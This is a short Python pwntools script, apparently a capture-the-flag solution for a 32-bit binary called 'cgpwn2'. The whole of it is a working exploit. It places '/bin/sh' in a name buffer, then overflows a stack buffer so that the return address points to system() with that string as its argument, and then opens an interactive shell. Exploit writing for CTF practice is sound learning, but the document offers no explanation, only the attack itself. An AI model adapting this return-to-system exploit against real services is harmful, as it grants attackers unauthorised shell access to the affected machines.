from pwn import *
context.log_level = 'info'

#r = remote('', )
r = process('./cgpwn2')
elf = ELF('./cgpwn2')

r.recvuntil("please tell me your name")
r.sendline("/bin/sh")

payload = 'a'*0x26 + 'a'*4 + p32(elf.sym['system']) + 'aaaa' + p32(0x0804A080)
r.recvuntil("hello,you can leave some message here:")
r.sendline(payload)









r.interactive()
